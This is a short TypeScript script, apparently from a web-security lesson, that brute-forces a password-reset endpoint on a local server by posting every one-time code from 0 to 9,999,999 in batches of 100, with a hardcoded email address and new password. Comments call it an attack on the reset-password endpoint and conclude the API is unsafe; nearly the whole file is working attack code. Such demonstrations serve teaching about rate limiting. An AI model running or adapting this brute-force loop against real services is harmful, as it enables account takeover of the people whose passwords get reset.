import axios from 'axios';

async function sendRequest(otp: string) {
  // postman request code
  let data = JSON.stringify({
    email: 'shubhamwagh@gmail.com',
    otp: otp,
    newPassword: 'test123',
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'Content-Type': 'application/json',
    },
    data: data,
  };
  try {
    await axios.request(config);
  } catch (e) {
    // console.log(e)
  }
}

/*
  :> attacking the reset-password endpoint
  Sending all requests at once: not the best way since sending these many requests can overload and crash the local API server (Out of Memory)
  Process may run out of memory
  Not an issue with production server since they have powerful CPUs

  Solution: send batch requests to api endpoint (1-100)

  for (let i = 0; i < 10000000; i++) {
    sendRequest(i.toString())
  }
*/

async function main() {
  // batching http requests in 100
  for (let i = 0; i < 10000000; i += 100) {
    console.log(i); // 100 requests once
    const p = [];
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    await Promise.all(p);
  }
}

main();

// now with this attach, one of the OTP will match the required OTP
// and reset-password api is not safe
